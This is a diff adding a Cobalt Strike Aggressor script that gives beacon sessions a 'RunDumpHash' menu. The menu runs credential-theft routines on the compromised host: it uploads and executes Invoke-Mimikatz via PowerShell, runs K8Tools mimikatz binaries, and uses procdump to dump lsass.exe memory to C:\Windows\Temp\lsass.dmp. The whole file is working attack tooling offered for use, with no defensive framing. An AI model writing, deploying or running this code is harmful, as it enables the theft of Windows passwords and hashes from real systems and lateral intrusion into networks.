@@ -1,0 +1,53 @@
+sub Runmimikatz {
+    bcd($bid, 'C:\\Windows\\Temp\\');
+    bupload($bid,script_resource("modules/Invoke-Mimikatz.ps1"));
+    bpowerpick($bid, "import-module C:\\Windows\\Temp\\Invoke-Mimikatz.ps1;Invoke-Mimikatz");
+}
+sub RunK8 {
+    bcd($bid, 'C:\\Windows\\Temp\\');
+    if (-is64 $bid['id']) {
+        bupload($bid,script_resource("modules/mz64.exe"));
+        bshell($bid, "C:\\Windows\\Temp\\mz64.exe");
+    }else{
+        bupload($bid,script_resource("modules/mz.exe"));
+        bshell($bid, "C:\\Windows\\Temp\\mz.exe");
+    }
+    
+}
+sub procdump {
+    bcd($bid, 'C:\\Windows\\Temp\\');
+    if (-is64 $bid['id']) {
+        bupload($bid,script_resource("modules/procdump64.exe"));
+        bshell($bid, "C:\\Windows\\Temp\\procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp");
+    }else{
+        bupload($bid,script_resource("modules/procdump.exe"));
+        bshell($bid, "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp");
+    }
+    
+}
+
+popup beacon_bottom {
+    menu "RunDumpHash" {
+        item "Use Powershell Run mimikatz" {
+            $bid = $1;
+            $dialog = dialog("Runmimikatz",%(),&Runmimikatz);
+            dialog_description($dialog, "Use Powershell Run mimikatz");
+            dbutton_action($dialog, "GO!");
+            dialog_show($dialog);
+        }
+        item "Use K8Tools Run mimikatz" {
+            $bid = $1;
+            $dialog = dialog("K8",%(),&RunK8);
+            dialog_description($dialog, "Use K8Tools Run mimikatz");
+            dbutton_action($dialog, "GO!");
+            dialog_show($dialog);
+        }
+         item "Use Procdump Dump lsass.dmp" {
+            $bid = $1;
+            $dialog = dialog("Procdump Dump",%(),&procdump);
+            dialog_description($dialog, "Use Procdump Dump lsass.dmp");
+            dbutton_action($dialog, "GO!");
+            dialog_show($dialog);
+        }
+    }
+}
